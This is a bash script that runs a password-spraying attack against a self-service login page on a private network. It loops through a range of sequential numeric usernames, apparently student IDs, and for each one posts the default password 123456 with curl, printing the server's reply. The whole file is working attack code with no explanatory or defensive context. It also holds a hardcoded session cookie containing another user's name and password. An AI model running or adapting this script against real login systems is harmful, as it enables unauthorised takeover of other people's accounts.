for USERNAME in $(seq 20190101185 20190102081)
do
	echo -e "try in  \033[04m$USERNAME 123456 \033[0m"
	echo ''
	echo ''
	curl 'http://10.1.1.2:8080/selfservice/module/scgroup/web/login_judge.jsf' \
	       	-H 'User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:80.0) Gecko/20100101 Firefox/80.0' \
	       	-H 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8' \
	       	-H 'Accept-Language: en-US,zh-CN;q=0.8,zh;q=0.6,zh-TW;q=0.4,zh-HK;q=0.2'  \
		--compressed \
	       	-H 'Content-Type: application/x-www-form-urlencoded' \
		-H 'Origin: http://10.1.1.2:8080' \
	       	-H 'DNT: 1' \
	       	-H 'Connection: keep-alive' \
	       	-H 'Referer: http://10.1.1.2:8080/selfservice/module/scgroup/web/login_self.jsf' \
		-H 'Cookie: JSESSIONID=83788F049992AFC8D15EACBAE81A0FED; rmbUser=true; userName=20190101181; passWord=123456' \
		-H 'Upgrade-Insecure-Requests: 1' \
		--data-raw "name=$USERNAME&password=123456" 2>&1 

	echo ''
	echo ''
done
